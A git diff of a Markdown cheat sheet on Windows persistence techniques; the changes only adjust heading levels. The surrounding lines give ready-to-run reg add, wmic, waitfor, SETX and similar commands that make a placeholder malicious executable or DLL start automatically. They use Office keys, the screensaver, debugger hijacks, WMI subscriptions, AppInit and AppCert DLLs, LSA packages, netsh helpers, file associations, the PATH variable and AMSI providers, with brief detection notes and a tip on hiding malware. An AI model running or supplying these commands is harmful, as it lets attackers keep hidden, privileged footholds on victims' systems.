@@ -3,13 +3,13 @@
 
 ##  Add malicious dll file in reg
 
-##### Example(Microsoft office):
+#### Example(Microsoft office):
 ```powershell
 reg add "HKCU\Software\OfficeMicrosoft\ test\Special\Perf" /t REG_SZ /d C:\path\to\badguy.dll
 ```
 Every time , when user start new session Microsoft office apps,  your payload will start too.
 
-##### Detection:
+#### Detection:
 User can see malicious string in reg **HKCU**
 
 </br></br>
@@ -18,7 +18,7 @@ User can see malicious string in reg **HKCU**
 
 Some programms search **.dll** files, which they need in their local directory. You can simply change this **dll's** to yours. (If programm has admin or system privilliges your dll will also have this privilliges)
 
-##### Detection:
+#### Detection:
 User can see malicious dll in folders of programms.
 
 </br></br>
@@ -30,7 +30,7 @@ Since the **.scr** files are essentially executables both extensions can be used
 
 *refer: https://pentestlab.blog/2019/10/09/persistence-screensaver/*
 
-##### Example (exe):
+#### Example (exe):
 To enable screen saver:
 
 ```powershell
@@ -52,7 +52,7 @@ To add your binary for screen saver:
 reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\path\to\badguy.exe"
 ```
 
-##### Detection:
+#### Detection:
 User can see malicious strings in reg **HKCU**
 
 </br></br>
@@ -79,7 +79,7 @@ waitfor badguy && C:\path\to\badguy.exe;
 ```
 
 You can run this command with endless loop, or Planning service, or make from this PowerShell [script](https://github.com/3gstudent/Waitfor-Persistence) which is storing the command in a **WMI** class in order to enable the wait mode continuously..
-##### Example:
+#### Example:
 
 ```powershell
 <#
@@ -122,7 +122,7 @@ You will send a signal to target_macheine, and your **badguy.exe** will be execu
 
 *refer: https://pentestlab.blog/2020/02/04/persistence-waitfor/*
 
-##### Detection:
+#### Detection:
 If you import module , user can see imported module's by
 
 ```powershell
@@ -138,7 +138,7 @@ write-host "$PSModulePath"
 ## Debugger
 
 
-##### Example:
+#### Example:
 
 ```powershell
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C C:\Windows\System32\calc.exe & c:\path\to\badguy.exe" /f
@@ -146,7 +146,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 
 Add command in **HKLM** reg,  that will execute your **badguy.exe** with copy of 
 
-##### Detection:
+#### Detection:
 User can see malicious string in reg **HKLM**
 
 
@@ -162,7 +162,7 @@ Typically persistence via WMI event subscription requires creation of the follow
 -   **EventConsumer** // Perform Action (execute payload etc.)
 -   **__FilterToConsumerBinding** // Binds Filter and Consumer Classes
 
-##### Example:
+#### Example:
 Execution of the following commands will create in the name space of _“**root\subscription**“_ three events. The arbitrary payload will executed within 60 seconds every time Windows starts.
 ```powershell
  wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="PentestLab", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
@@ -173,7 +173,7 @@ Execution of the following commands will create in the name space of _“**root\
 Insert in database new event and set timer for execution.
 
 
-##### Detection:
+#### Detection:
 
 User can see malicious string in *WMI Database Enties*
 
@@ -181,8 +181,8 @@ User can see malicious string in *WMI Database Enties*
 
 ## AppInit
 
-##### Example:
-###### For x64 programs:
+#### Example:
+##### For x64 programs:
 ```powershell
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
 
@@ -190,7 +190,7 @@ reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_D
 
 ```
 
-###### For x32 programs:
+##### For x32 programs:
 ```powershell
 reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
 
@@ -199,7 +199,7 @@ reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" 
 
 Turn LoadAppInit_DLLs to 1 and add in AppInit_DLLs path to malware.
 
-##### Detection:
+#### Detection:
 
 User can see, that value of **LoadAppInit_DLLs** at *HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows* or  *HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows* set to 1 and also see malicious string at the same path in  **AppInit_DLLs**.
 
@@ -208,21 +208,21 @@ User can see, that value of **LoadAppInit_DLLs** at *HKLM\Software\Wow6432Node\M
 
 ## System process Lsass
 
-##### Example:
+#### Example:
 ```powershell
 reg add "HKLM\system\currentcontrolset\control\lsa" /v "Notification Packages" /t reg_multi_sz /d "c:\path\to\badguy.dll" /f
 
 ```
 Just add library for *Lsass* process
 
-##### Detection:
+#### Detection:
 User can see malicious string in reg **HKLM**
 
 </br></br>
 	
 ## Netsh
 
-##### Example:
+#### Example:
 ```powershell
  cmd> c:\windows\syswow64\netsh.exe
 
@@ -232,14 +232,14 @@ User can see malicious string in reg **HKLM**
 ```
 add dll helpper module to netsh than add netsh to autorun
 
-##### Detection:
+#### Detection:
 User will see *Netsh* program in autorun (but it's hard to see **badguy32.dll**)
 
 </br></br>
 
 ## AppCert DLLs
 
-   ##### Example:
+   #### Example:
 ```powershell
 reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v AppCertDLLs /t REG_SZ /d "C:\path\to\badguy.dll"
 
@@ -248,28 +248,28 @@ reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v AppCertDLLs /
 
 
 
-##### Detection:
+#### Detection:
 User can see malicious string in reg **HKLM**
 
 </br></br>
 
 ## Authentification Packages
 
-##### Example:
+#### Example:
 ```powershell
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages" /v persistence /t REG_SZ /d "C:\path\to\badguy.exe"
 
 ```
 
 *badguy.exe* execute when system load packets **Authentication Pack** on start of the system
-##### Detection:
+#### Detection:
 User can see malicious string in reg **HKLM**
 
 </br></br>
 
 ## Change default file association 
 
-##### Example (txt):
+#### Example (txt):
 ```powershell
 reg add "HKEY_CLASSES_ROOT\textfile\shell\open\command" /v (Default) /t REG_SZ /d "C:\path\to\badguy.exe"
 ```
@@ -284,7 +284,7 @@ User can see malicious string in reg **HKCR**
 If some path is set ,for example, before *c:\Windows\System32*  it mean that all common progs in *System32* first will be checked in other directory.
 You can change **Path** variable to insert your "malicious" directory with progs, with names like in *System32*. When this com	mands executes , your programs runs.
 
-##### Example:
+#### Example:
 ```powershell
 SETX /M PATH "C:\badguy;%PATH%"
 
@@ -293,7 +293,7 @@ Where in *badguy* folder you put programs for commands, that you need
 (for more  secrecy you can join(with *joiner* maybe) your malware soft with program(s) which  you replace)
 
 
-##### Detection:
+#### Detection:
 User can see **PATH** variable
 
 </br></br>
@@ -360,7 +360,7 @@ Add *badguy.dll* in *W32Time* Timeprovider service. NtpClient starts with system
 
 *refer: https://pentestlab.blog/2019/10/22/persistence-time-providers/*
 
-##### Detection:
+#### Detection:
 
 User can see malicious **dll** in reg of **W32Time**
 
@@ -603,7 +603,7 @@ When the keyword(**badguy** in our case) is passed on a PowerShell console the t
 
 *refer: https://pentestlab.blog/2021/05/17/persistence-amsi/*
 
-##### Detection:
+#### Detection:
 
 User can see strange AMSI Provider in reg.
 
